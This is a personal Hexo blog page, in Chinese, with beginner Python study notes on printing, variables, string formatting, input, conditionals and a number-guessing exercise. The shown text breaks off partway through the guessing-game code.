@@ -1,0 +1,1481 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="py-web, wuk0Ng">
+    <meta name="description" content="wuk0Ng的个人博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>py-web | wuk0Ng</title>
+    <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(/medias/my_background.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/jiushen.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wuk0Ng</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/jiushen.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wuk0Ng</div>
+        <div class="logo-desc">
+            
+            wuk0Ng的个人博客
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/web-wuk0Ng" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/web-wuk0Ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">py-web</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                                <span class="chip bg-color">比赛</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                记录
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-09-25
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="py基础"><a href="#py基础" class="headerlink" title="py基础"></a>py基础</h1><p>前言，因为我是单个单个的py程序整合在一起的（利用脚本实现）<br>生成的md文本有很多问题。并且这里的知识点是基础的，不完善的<br>这里我们会意即可（主要是来水篇文章，bushi）<br>还有就是马上html5和css3还有js<br>以及java开发等等也会上线</p>
+<h2 id="1第一个py程序-py"><a href="#1第一个py程序-py" class="headerlink" title="1第一个py程序.py"></a>1第一个py程序.py</h2><p>print(“hello world”)</p>
+<h2 id="2第一个python小程序练习-py"><a href="#2第一个python小程序练习-py" class="headerlink" title="2第一个python小程序练习.py"></a>2第一个python小程序练习.py</h2><p>#请在命令提示符这里输入“零基础，学it，就来黑马程序员”<br>print(“零基础，学it,就来黑马程序员”)</p>
+<h2 id="3python中的字面量-py"><a href="#3python中的字面量-py" class="headerlink" title="3python中的字面量.py"></a>3python中的字面量.py</h2><p>print(666)<br>print(13.14)<br>print(“黑马程序员”)</p>
+<h2 id="4注释-py"><a href="#4注释-py" class="headerlink" title="4注释.py"></a>4注释.py</h2><p>这<br>个<br>是<br>多行<br>注释</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这是单行注释，建议写一个空格</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="5变量-py"><a href="#5变量-py" class="headerlink" title="5变量.py"></a>5变量.py</h2><p>输出结果<br>10<br>hello world<br>钱包还有： 10<br>钱包还有： 40</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line">b = <span class="string">&quot;hello world&quot;</span></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;钱包还有：&quot;</span>,a)</span><br><span class="line"></span><br><span class="line">money = <span class="number">50</span></span><br><span class="line">money = money - <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;钱包还有：&quot;</span>,money)</span><br></pre></td></tr></table></figure>
+
+<h2 id="6数据类型-py"><a href="#6数据类型-py" class="headerlink" title="6数据类型.py"></a>6数据类型.py</h2><p>字符串<br>整形<br>浮点型<br>type()</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="string">&quot;黑马程序员&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="7数据类型转换-py"><a href="#7数据类型转换-py" class="headerlink" title="7数据类型转换.py"></a>7数据类型转换.py</h2><p>从文件中读取数字，默认是字符串，我们需要转换为数字</p>
+<p>Int(x),将x转换成一个整数.</p>
+<p>float(x),将x转换为浮点数<br>str(x),将对象转换为字符串<br>同前面的type，这些的都带有返回的结果，可以print或者用变量接收</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#数字换为字符串</span></span><br><span class="line">num_str = <span class="built_in">str</span>(<span class="number">11</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(num_str),num_str)<span class="comment">#&lt;class &#x27;str&#x27;&gt; 11结果</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="8标识符-py"><a href="#8标识符-py" class="headerlink" title="8标识符.py"></a>8标识符.py</h2><p>标识符：</p>
+<p>内容限定：英文、中文（少）、数字、下划线。</p>
+<p>数字不可以用在开头</p>
+<p>大小写敏感：完全区分</p>
+<p>不可使用关键字：一系列的，不需要去背。同样大小写敏感。</p>
+<p>标识符命名规范:</p>
+<p>见名知意：</p>
+<p>下滑线:多个单词时，非驼峰</p>
+<p>英文字母小写:</p>
+<h2 id="9运算符-py"><a href="#9运算符-py" class="headerlink" title="9运算符.py"></a>9运算符.py</h2><p>#加减乘除这些就不说了，那我字符串加字符串呢？之前一直没有想过或者问题<br>print(“woshi”+”mniubi”)#结果：woshimniubi，拼接到了一起</p>
+<h2 id="10字符串的定义方法-py"><a href="#10字符串的定义方法-py" class="headerlink" title="10字符串的定义方法.py"></a>10字符串的定义方法.py</h2><p>三种定义方法，单双,三引号<br>单引号可以内含双引号<br>双内含单<br>可以使用转义字符来将引号接触效果，变为普通字符串<br>如下，我直接用的话就报错了</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;\&quot;黑马程序员\&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(name)</span><br></pre></td></tr></table></figure>
+
+<h2 id="11字符串的拼接-py"><a href="#11字符串的拼接-py" class="headerlink" title="11字符串的拼接.py"></a>11字符串的拼接.py</h2><p>不能字符串和数字型的拼接</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#前面讲了，+来，我还以为没讲过，只是我忘记了</span></span><br><span class="line">name = <span class="string">&quot;黑马程序员&quot;</span></span><br><span class="line">fen = <span class="string">&quot;fensi&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;woshi:&quot;</span>+name+fen)<span class="comment">#结果：woshi:黑马程序员fensi</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="12字符串格式化-py"><a href="#12字符串格式化-py" class="headerlink" title="12字符串格式化.py"></a>12字符串格式化.py</h2><p>#我们可以通过如下语法，完成字符串和变量之间的的快速拼接<br>name &#x3D; “黑马程序员”<br>message &#x3D; “学IT就来 %s” % name<br>print(message)#结果：学IT就来 黑马程序员。其中，%s表示我要占位，s表示将变量变成字符串放入占位的地方<br>#那刚才不支持的数字类型的拼接可以用到这里吗？<br>num &#x3D; 123<br>zjnu &#x3D; “henyui %s,hihi %s” % (message,num)<br>print(zjnu)#结果：henyui 学IT就来 黑马程序员,hihi 123</p>
+<p>#但是上面的数字的拼接是换为了字符串格式进行的拼接，我们在这里可以%d数字进行拼接，%f浮点类型进行拼接</p>
+<h2 id="13字符串格式化的精度控制-py"><a href="#13字符串格式化的精度控制-py" class="headerlink" title="13字符串格式化的精度控制.py"></a>13字符串格式化的精度控制.py</h2><p>数字11宽度限制5，结果是:   11<br>数字11宽度限制为1，结果是: 11<br>数字11.345宽度限制7，小数精度2,结果是：  11.35<br>数字11.345宽度限制7，小数精度2,结果是：11.35</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#我们可以使用辅助符号&quot;m.n&quot;来控制数据的宽度和精度</span></span><br><span class="line"><span class="comment">#m.控制宽度，要求是数字（很少使用），设置的宽度小于数字自身，不生效</span></span><br><span class="line"><span class="comment">#.n,控制小数点精度，要求是数字，会进行小数的四四舍五入</span></span><br><span class="line"><span class="comment">#示例：%5表示将整数的宽度控制在5位，如数字11，被设置为5d，就会变成：[空格][空格][空格]11,用三个空格补足宽度</span></span><br><span class="line"><span class="comment">#%5.2f：表示将宽度控制为5，小数点精度为2</span></span><br><span class="line"><span class="comment">#小数点和小数部分也算入宽度计算。如：对11.345设置了%7.2f后，结果是【空格】【空格】11.35。2个空格补足宽度，小数部分限制为2位精度后，四舍五入为.35</span></span><br><span class="line">num1 = <span class="number">11</span></span><br><span class="line">num2 = <span class="number">11.345</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数字11宽度限制5，结果是:%5d&quot;</span> % num1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数字11宽度限制为1，结果是: %1d&quot;</span> % num1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数字11.345宽度限制7，小数精度2,结果是：%7.2f&quot;</span> %num2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;数字11.345宽度限制7，小数精度2,结果是：%.2f&quot;</span> %num2)</span><br></pre></td></tr></table></figure>
+
+<h2 id="14字符串格式化方式2-py"><a href="#14字符串格式化方式2-py" class="headerlink" title="14字符串格式化方式2.py"></a>14字符串格式化方式2.py</h2><p>#通过语法：f”内容{变量}的格式来快速格式化”<br>name &#x3D; “谭绍清”<br>num &#x3D; 111<br>monry &#x3D; 5000.1<br>print(f”我是{name},编号是{num},我身上的钱有{monry}”)#结果：我是谭绍清,编号是111,我身上的钱有5000.1</p>
+<h2 id="15对表达式进行格式化-py"><a href="#15对表达式进行格式化-py" class="headerlink" title="15对表达式进行格式化.py"></a>15对表达式进行格式化.py</h2><p>1<em>1的结果是：1<br>1</em>1的结果是: 1<br>字符串在python中的类型是:&lt;class ‘str’&gt;</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#表达式：一条具有明确执行结果的代码语句</span></span><br><span class="line"><span class="comment">#1+1,5*2就是表达式，因为有具体的结果，结果就是一个数字</span></span><br><span class="line"><span class="comment">#name=&quot;张三&quot;,&quot;张三&quot;就是表达式。age =11+11，那么11+11就是表达式</span></span><br><span class="line"><span class="comment">#下面的那个很像ssti</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;1*1的结果是：%d&quot;</span> % (<span class="number">1</span>*<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;1*1的结果是: <span class="subst">&#123;<span class="number">1</span>*<span class="number">1</span>&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;字符串在python中的类型是:%s&quot;</span> % <span class="built_in">type</span>(<span class="string">&#x27;我&#x27;</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="16input语句-py"><a href="#16input语句-py" class="headerlink" title="16input语句.py"></a>16input语句.py</h2><p>请告诉我你的：11<br>11<br>你是真的牛逼：22<br>22</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;请告诉我你的：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>(<span class="string">&quot;你是真的牛逼：&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="17布尔类型和比较运算符-py"><a href="#17布尔类型和比较运算符-py" class="headerlink" title="17布尔类型和比较运算符.py"></a>17布尔类型和比较运算符.py</h2><p>#布尔类型用于表示：真和假<br>#掌握比较预算符用于计算：真和假<br>#布尔类型：True真，False假<br>#定义变量储存布尔类型数据，变量名称 &#x3D; 布尔类型字面量<br>#布尔类型不仅可以通过自行定义，同时也可以通过计算来得到。也就是比较预算符及逆行比较运算得到布尔类型的结果<br>#主要的六类比较预算符，这里不再多叙述</p>
+<h2 id="18if语句的基本格式-py"><a href="#18if语句的基本格式-py" class="headerlink" title="18if语句的基本格式.py"></a>18if语句的基本格式.py</h2><p>#注意冒号和四个空格表示的缩进<br>age &#x3D; 18<br>if age &gt;&#x3D; 18:<br>    print(“我已经成年了”)</p>
+<h2 id="19案列成年人的判断-py"><a href="#19案列成年人的判断-py" class="headerlink" title="19案列成年人的判断.py"></a>19案列成年人的判断.py</h2><p>1.通过input语句，获取键盘输入，为变量age复制。（注意转化为数字类型）<br>2.通过if判断是否是成年人，满足条件则输出提示信息：<br>欢迎来到黑马儿童游乐场，儿童免费，成人收费<br>请输入你的年龄：30<br>您已成年，游玩需要补票10元<br>祝你游玩愉快</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;欢迎来到黑马儿童游乐场，儿童免费，成人收费&quot;</span>)</span><br><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入你的年龄：&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> age &gt;= <span class="number">18</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;您已成年，游玩需要补票10元&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;欢迎小朋友&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;祝你游玩愉快&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="20if-else的组合判断-py"><a href="#20if-else的组合判断-py" class="headerlink" title="20if-else的组合判断.py"></a>20if-else的组合判断.py</h2><p>if 条件 ：<br>    要执行的<br>else :<br>    要执行的</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#上节课我的案列已经用上了，那就这样了</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="21if-elif-else综合使用-py"><a href="#21if-elif-else综合使用-py" class="headerlink" title="21if elif else综合使用.py"></a>21if elif else综合使用.py</h2><p>1.定义一个变量，数字类型，内容随意<br>2.基于input语句输入猜想的数字，通过if和多次elif的组合，判断猜想的数字和心里数字是否一致<br>请输入第一次猜想的数字：1<br>不对，再猜一次：2<br>不对，再猜最后一次：3<br>sorry,全部猜错了，我想的是： 10</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#掌握这种使用方法完成多种条件的判断</span></span><br><span class="line"><span class="comment">#这个我直接使用案列来完成练习</span></span><br><span class="line">num = <span class="number">10</span></span><br><span class="line">num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入第一次猜想的数字：&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> num1 == num :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;恭喜你猜对了！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    num2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;不对，再猜一次：&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> num2 == num :</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;恭喜你猜对了！&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        num3 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;不对，再猜最后一次：&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> num3 == num:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;恭喜你猜对了！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;sorry,全部猜错了，我想的是： 10&quot;</span>)</span><br><span class="line"><span class="comment">#这个是没有问题的，但是怎么没有用到我们的相关知识，而是用到了嵌套的循环。因为py的逻辑是你有</span></span><br><span class="line"><span class="comment">#input在，第一个就算是错了也会进入到下一个input不断判断。当然，我的这个肯定更好</span></span><br><span class="line"><span class="comment">#这个也算是嵌套循环的练习了</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="22循环判断语句综合练习-py"><a href="#22循环判断语句综合练习-py" class="headerlink" title="22循环判断语句综合练习.py"></a>22循环判断语句综合练习.py</h2><p>案例需求：定义一个数字（1<del>10随机产生），通过三次判断来猜出数字<br>案例要求：<br>1.数字随机产生，范围1</del>10<br>2.有三次机会猜测数字，通过三层嵌套判断实现<br>3.每次猜不中，会提示大了或小了<br>提示，通过如下代码，可以定义一个变量num，变量内存储存随机数字<br>import random<br>num &#x3D; random.randint(1,10)</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">num = random.randint(<span class="number">1</span>,<span class="number">10</span>)</span><br><span class="line">num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请您对1~10之间的整数进行猜测，进行第一次猜测，共三次机会：&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> num1 == num :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;恭喜你，猜对了&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> num1 &gt;= num:</span><br><span class="line">    <span 